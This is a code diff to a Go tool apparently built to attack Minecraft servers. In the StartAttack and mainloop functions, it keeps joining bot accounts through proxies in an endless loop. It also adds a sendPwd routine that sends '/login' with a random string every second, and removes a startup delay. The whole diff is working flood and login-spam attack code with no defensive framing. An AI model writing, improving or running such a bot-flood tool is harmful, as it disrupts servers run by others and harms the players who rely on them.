@@ -5,6 +5,7 @@ import (
 	"github.com/Tnze/go-mc/bot"
 	"github.com/Tnze/go-mc/chat"
 	"github.com/google/uuid"
+	"github.com/yezihack/colorlog"
 	"log"
 	"math/rand"
 	"time"
@@ -24,7 +25,6 @@ func StartAttack() {
 
 	notjoined = utils.Data
 
-	time.Sleep(time.Second *20)
 
 	//if true {
 	//	time.Sleep(time.Second * 10)
@@ -38,10 +38,15 @@ func StartAttack() {
 }
 
 func mainloop() {
-	if true {
-		for ID, name := range utils.Data {
-			uuid, _ := uuid.FromBytes([]byte(ID))
-			go playerJoin(name, uuid)
+	for true {
+		if proxyupdatedone {
+			for ID, name := range utils.Data {
+				uuid, _ := uuid.FromBytes([]byte(ID))
+				go playerJoin(name, uuid)
+				time.Sleep(time.Second *10)
+			}
+		} else {
+			colorlog.Info("Wait for Proxy check")
 			time.Sleep(time.Second *10)
 		}
 	}
@@ -66,17 +71,26 @@ func playerJoin(name string, ID uuid.UUID) {
 		log.Println(err)
 		return
 	} else {
-		log.Println("Login success: " + name)
+		colorlog.Error("Login success: " + name)
 	}
+
+	go sendPwd(client)
+
 	err = client.HandleGame()
-	client.SendMessage(RandStringBytes(100))
 	if err != nil {
-		log.Println(err)
+		colorlog.Warn(err.Error())
+	}
+}
+
+func sendPwd(client *bot.Client)  {
+	for true {
+		client.SendMessage("/login " + RandStringBytes(rand.Intn(100)))
+		time.Sleep(time.Second *1)
 	}
 }
 
 func onDisconnect(reason chat.Message) error {
-	log.Println("Disconnected:" + reason.Text)
+	colorlog.Error("Disconnected:" + reason.Text)
 	return nil
 }
 
